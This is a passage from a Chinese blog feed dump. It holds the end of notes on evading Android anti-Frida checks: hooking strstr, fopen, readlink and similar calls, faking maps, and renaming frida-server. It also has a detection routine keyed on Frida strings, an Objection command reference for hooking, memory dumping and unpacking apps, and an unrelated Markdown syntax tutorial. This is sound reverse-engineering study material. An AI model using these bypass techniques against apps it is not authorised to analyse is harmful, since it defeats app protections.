dlopen(函数名)</code></p></li></ol><h3 id="几种绕过方法">几种绕过方法</h3><ol><li><p>线程检测 将函数NewObject置空绕过检测<br><img src="assets/image-20240504110300858.png" alt="image-20240504110300858"></p></li><li><p>hook strstr函数 匹配上了就strstr返回值置0 类比strcmp<br><img src="assets/image-20240504110756791.png" alt=" "></p></li></ol><p>3.stat函数<br><img src="assets/image-20240504111746824.png" alt="image-20240504111746824"></p><p>4.fopen函数<br><img src="assets/image-20240504112039454.png" alt="image-20240504112039454"></p><p>5.fgets函数<br><img src="assets/image-20240504112217742.png" alt="image-20240504112217742"></p><p>6.maps检测 伪造maps<br><img src="assets/image-20240504112530798.png" alt="image-20240504112530798"></p><p>7.端口绕过<br>启动frida-server 换进程名，监听0.0.0.0:8899  ./ffff -l 0.0.0.0:8899</p><p>用户端连接方式 ： frida -H ip：端口 -F -l xxx.js</p><p>8.fd检测</p><p>fd的引用一般使用readlink()函数 hook这个函数即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">bool <span class="title function_">check_fd</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR *dir = NULL;</span><br><span class="line">    struct dirent *entry;</span><br><span class="line">    <span class="type">char</span> link_name[<span class="number">100</span>];</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="type">bool</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ((dir = opendir(<span class="string">&quot;/proc/self/fd/&quot;</span>)) == NULL) &#123;</span><br><span class="line">        LOGI(<span class="string">&quot; %s - %d  error:%s&quot;</span>, __FILE__, __LINE__, strerror(errno));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        entry = readdir(dir);</span><br><span class="line">        <span class="keyword">while</span> (entry) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (entry-&gt;d_type) &#123;</span><br><span class="line">                <span class="keyword">case</span> DT_LNK:</span><br><span class="line">                    sprintf(link_name, <span class="string">&quot;%s/%s&quot;</span>, <span class="string">&quot;/proc/self/fd/&quot;</span>, entry-&gt;d_name);</span><br><span class="line">                    readlink(link_name, buf, sizeof(buf));</span><br><span class="line">                    <span class="keyword">if</span> (strstr(buf, <span class="string">&quot;frida&quot;</span>) || strstr(buf, <span class="string">&quot;gum-js-loop&quot;</span>) ||</span><br><span class="line">                        strstr(buf, <span class="string">&quot;gmain&quot;</span>) ||</span><br><span class="line">                        strstr(buf, <span class="string">&quot;-gadget&quot;</span>) || strstr(buf, <span class="string">&quot;linjector&quot;</span>)) &#123;</span><br><span class="line">                        LOGI(<span class="string">&quot;check_fd -&gt; find frida:%s&quot;</span>, buf);</span><br><span class="line">                        ret = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            entry = readdir(dir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>syscall ==》Frida -Seccomp</p><p>b站frida检测分析案例：bilibili <a href="https://bbs.kanxue.com/thread-278282.htm">https://bbs.kanxue.com/thread-278282.htm</a></p><h1>Objection使用</h1><p>~/.objection/objection.log存放日志，好像每次运行都会在这个log文件中更新，所以在得到特定日志后退出objection，然后把objection.log换名放在别的目录下避免受到干扰</p><p>进入objection调试时 按空格有提示 !ls</p><ul><li>注入进程</li></ul><p><code>objection -g 包名 explore</code></p><ul><li>查看历史命令</li></ul><p><code>commands history</code></p><ul><li>列出内存所有的类</li></ul><p><code>android hooking list classes</code></p><ul><li>列出当前可用activities</li></ul><p><code>android hooking list activities</code></p><ul><li>获得当前界面的activity</li></ul><p><code>android hooking get current_activity</code></p><ul><li>在内存中所有加载的类中搜索包含特定关键词的类</li></ul><p><code>android hooking search classes com.xiaojianbang.app</code></p><ul><li>列出类中的所有方法(不包括构造方法)</li></ul><p><code>android hooking list class_methods com.xiaojianbang.app.MD5</code></p><ul><li>hook类下的所有方法</li></ul><p><code>android hooking watch class com.xiaojianbang.app.MD5 </code></p><ul><li>查看hook了多少个类</li></ul><p><code>jobs list</code></p><ul><li>去除hook的类</li></ul><p><code>jobs kill + job ID</code></p><ul><li>hook方法的参数 返回值 调用栈(会默认hook它的重载函数)</li></ul><p><code>android hooking watch class_method com.xiaojianbang.app.MD5.md5_1 --dump-args --dump-return --dump-backtrace</code></p><ul><li>hook其中的一个重载 指定参数类型，多个参数逗号隔开</li></ul><p><code>android hooking watch class_method com.xiaojianbang.app.Utils.test &quot;com.xiaojianbang.app.Money&quot;</code></p><ul><li>搜索堆中的实例</li></ul><p><code>android heap search instances &quot;com.xiaojianbang.app.Money&quot; </code></p><ul><li>列出某个应用中的类</li></ul><p><code>android hooking search classes 包名</code></p><ul><li>寻找某个方法</li></ul><p><code>android hooking search methods+方法名</code></p><ul><li><p>hook 某个特定的方法<br>android hooking watch class_method 方法名 参数1，参数2 --dump-args --dump-backtrace --dump-return</p></li><li><p>调用实例的方法</p></li></ul><p><code>android heap execute 地址(查找实例时的HashCode) 方法名</code></p><ul><li><p>android heap evaluate+查找实例时的HashCode+调用的方法名   调用带参数的方法</p></li><li><p>以ip方式连接</p></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">frida端</span><br><span class="line">./frida-server -l <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">9999</span></span><br><span class="line"></span><br><span class="line">另一端cmd</span><br><span class="line">objection -N -h 手机ip -<span class="selector-tag">p</span> <span class="number">9999</span> -<span class="selector-tag">g</span> 包名 explore</span><br></pre></td></tr></table></figure><ul><li>启动前hook某方法(spawn模式)</li></ul><p><code>objection -N -h 手机ip -p 9999 -g 包名 explore --startup-command &quot;android hooking watch class_method 'com.xiaojianbang.app.Utils.getCalc'&quot;</code></p><p>使用Wallbreaker插件</p><ul><li>加载插件</li></ul><p><code>plugin load D:/fridaproject/frida-agent-example/fridascript/Wallbreaker-mas ter</code></p><p>或者</p><p><code>objection -g 包名 export -P + 插件路径</code></p><ul><li>搜索类</li></ul><p><code>plugin wallbreaker classsearch com.xiaojianbang.app.Money</code></p><ul><li>搜索对象</li></ul><p><code>plugin wallbreaker objectsearch com.xiaojianbang.app.Money</code></p><ul><li>输出类的结构</li></ul><p><code>plugin wallbreaker classdump --fullname com.xiaojianbang.app.Money</code></p><ul><li>对象结构</li></ul><p><code>plugin wallbreaker objectdump &lt;handle&gt;</code></p><p>handle为<code>plugin wallbreaker objectsearch com.xiaojianbang.app.Money</code>前面的值</p><p>另一个插件 frida-dexdump 可以脱部分壳 如360</p><ul><li>加载</li></ul><p><code>plugin load D:/fridaproject/frida-agent-example/fridascript/frida-dexdump-master/frida_dexdump</code></p><ul><li>脱壳</li></ul><p><code>plugin dexdump dump</code></p><ul><li><p>开启一个存在的Activity</p><p><code>android intent launch_activity Activity所在的类路径</code><br>frida-dump -UF -d   <code>-d</code>==》深度搜索</p></li><li><p>查看内存中加载的模块</p></li></ul><p><code>memory list modules</code></p><ul><li>查看模块的导出表</li></ul><p><code>memory list exports 模块名</code> --json +路径  打出导出函数名字和地址(到路径中)</p><ul><li>dump指定内存</li></ul><p><code>memory dump frome_base +起始地址+dump的大小 +输出路径</code></p><ul><li>objection 批量trace</li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">先 android hooking  android hooking search classes 包名 获得所有的类</span><br><span class="line">再 把命令 android hooking watch <span class="keyword">class</span> 类<span class="number">1</span> android hooking watch <span class="keyword">class</span> 类<span class="number">2.</span>.. 写入一个txt中</span><br><span class="line">最后 执行 objection -g 包名 <span class="keyword">export</span> -c 加载的txt文件</span><br><span class="line">就可以执行txt中的所有命令</span><br><span class="line"></span><br><span class="line">nano cipher.txt</span><br><span class="line">sed -i -e <span class="string">&#x27;s/^/android hooking watch class /&#x27;</span> cipher.txt</span><br><span class="line">注意<span class="keyword">class</span>后面的一个空格</span><br></pre></td></tr></table></figure><ul><li>免root使用objection操作app<br>objection patchapk --architecture + apk中lib下的存在架构 --source apk名称<br>objection  patchapk  --architecture armeabi-v7a --use-aapt2  --source yourAPK.apk</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法与外挂标签写法汇总</title>
      <link href="/posts/2013454d.html"/>
      <url>/posts/2013454d.html</url>
      
        <content type="html"><![CDATA[<h1>1.Markdown语法自带格式</h1><div class="note info flat"><p>参考：<a href="https://blog.csdn.net/u014061630/article/details/81359144">Markdown语法图文全面详解(10分钟学会)</a></p></div><div class="note warning flat"><p>注意：此页面偶尔会存在CSS冲突问题!</p></div><h2 id="1-1-代码块">1.1 代码块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">\```shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br><span class="line">\```</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-2-多级标题">1.2 多级标题</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># H1</span></span><br><span class="line"><span class="section">## H2</span></span><br><span class="line"><span class="section">### H3</span></span><br><span class="line"><span class="section">#### H4</span></span><br><span class="line"><span class="section">##### H5</span></span><br><span class="line"><span class="section">###### H6</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>见本文章标题!</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-3-文字样式">1.3 文字样式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>下划线演示<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">文字<span class="strong">**加粗**</span>演示</span><br><span class="line"></span><br><span class="line">文字<span class="emphasis">*斜体*</span>演示</span><br><span class="line"></span><br><span class="line">文本<span class="code">`高亮`</span>演示</span><br><span class="line"></span><br><span class="line">文本~~删除~~线演示</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span> = <span class="string">5</span>&gt;</span></span>5号字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span></span>蓝色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>=<span class="string">MistyRose</span>&gt;</span></span>这里的背景色是：MistyRosen，此处输入任意想输入的内容<span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><u>下划线演示</u></p><p>文字<strong>加粗</strong>演示</p><p>文字<em>斜体</em>演示</p><p>文本<code>高亮</code>演示</p><p>文本<s>删除</s>线演示</p><p><font size = 5>5号字</font><br><font face="黑体">黑体</font><br><font color=blue>蓝色</font></p><table><tr><td bgcolor=MistyRose>这里的背景色是：MistyRosen，此处输入任意想输入的内容</td></tr></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><div class="note info flat"><p>上述要点可参考:<a href="https://blog.csdn.net/qq_43732429/article/details/108034518">【Markdown语法】字体颜色大小及文字底色设置</a></p></div><h2 id="1-4-引用">1.4 引用</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt;  Java</span></span><br><span class="line"><span class="quote">&gt; 二级引用演示</span></span><br><span class="line"><span class="quote">&gt; MySQL</span></span><br><span class="line"><span class="quote">&gt; &gt;外键</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;事务</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;<span class="strong">**行级锁**</span>(引用内部一样可以用格式)</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; ....</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><blockquote><p>Java<br>二级引用演示<br>MySQL</p><blockquote><p>外键</p><p>事务</p><p><strong>行级锁</strong>(引用内部一样可以用格式)</p></blockquote><p>…</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-5-分割线">1.5 分割线</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><hr><hr><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-6-列表-跟空格都可以">1.6 列表(*,+,-跟空格都可以)</h2><h3 id="1-6-1-无序列表">1.6.1 无序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> Java</span><br><span class="line"><span class="bullet">*</span> Python</span><br><span class="line"><span class="bullet">*</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> Java</span><br><span class="line"><span class="bullet">+</span> Python</span><br><span class="line"><span class="bullet">+</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> Java</span><br><span class="line"><span class="bullet">-</span> Python</span><br><span class="line"><span class="bullet">-</span> ...</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="1-6-2-有序列表">1.6.2 有序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 注意后面有空格</span></span><br><span class="line"><span class="bullet">1.</span> </span><br><span class="line"><span class="bullet">2.</span> </span><br><span class="line"><span class="bullet">3.</span> </span><br><span class="line"><span class="bullet">4.</span> </span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li></li><li></li><li></li><li></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-7-图片">1.7 图片</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 本地图片</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/assets/pusheencode.webp&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:50%;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="section"># 在线图片</span></span><br><span class="line">![<span class="string">code</span>](<span class="link">https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>本地图片:<br><img src="/assets/pusheencode.webp" alt="示例图片" style="zoom:50%;" /><br>在线图片:<br><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/markdown_pic/img/code.png" alt="code"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-8-表格">1.8 表格</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 项目标号 | 资金     | 备注 |</span><br><span class="line">| -------- | -------- | ---- |</span><br><span class="line">| 1        | 100，000 | 无   |</span><br><span class="line">| 2        | 200，000 | 无   |</span><br><span class="line">| 3        | 300,600  | 重要 |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th>项目标号</th><th>资金</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>100，000</td><td>无</td></tr><tr><td>2</td><td>200，000</td><td>无</td></tr><tr><td>3</td><td>300,600</td><td>重要</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-9-公式">1.9 公式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\Gamma(z)=\int<span class="emphasis">_0^\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt.</span></span><br><span class="line"><span class="emphasis">$$</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>$$<br>\Gamma(z)=\int_0^\infty t^{z-1}e^{-t}dt.<br>$$</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1>2.Butterfly外挂标签</h1><div class="note info flat"><p>这部分参考安知鱼:<a href="https://anzhiy.cn/posts/7d58.html">基于Butterfly的外挂标签引入</a></p></div><h2 id="2-1-行内文本样式-text">2.1 行内文本样式 text</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% u 文本内容 %&#125;</span><br><span class="line">&#123;% emp 文本内容 %&#125;</span><br><span class="line">&#123;% wavy 文本内容 %&#125;</span><br><span class="line">&#123;% del 文本内容 %&#125;</span><br><span class="line">&#123;% kbd 文本内容 %&#125;</span><br><span class="line">&#123;% psw 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 带 &#123;% u 下划线 %&#125; 的文本</span><br><span class="line"><span class="bullet">2.</span> 带 &#123;% emp 着重号 %&#125; 的文本</span><br><span class="line"><span class="bullet">3.</span> 带 &#123;% wavy 波浪线 %&#125; 的文本</span><br><span class="line"><span class="bullet">4.</span> 带 &#123;% del 删除线 %&#125; 的文本</span><br><span class="line"><span class="bullet">5.</span> 键盘样式的文本 &#123;% kbd command %&#125; + &#123;% kbd D %&#125;</span><br><span class="line"><span class="bullet">6.</span> 密码样式的文本：&#123;% psw 这里没有验证码 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><ol><li>带 <u>下划线</u> 的文本</li><li>带 <emp>着重号</emp> 的文本</li><li>带 <wavy>波浪线</wavy> 的文本</li><li>带 <del>删除线</del> 的文本</li><li>键盘样式的文本 <kbd>command</kbd> + <kbd>D</kbd></li><li>密码样式的文本：<psw>这里没有验证码</psw></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-2-行内文本-span">2.2 行内文本 span</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% span 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span 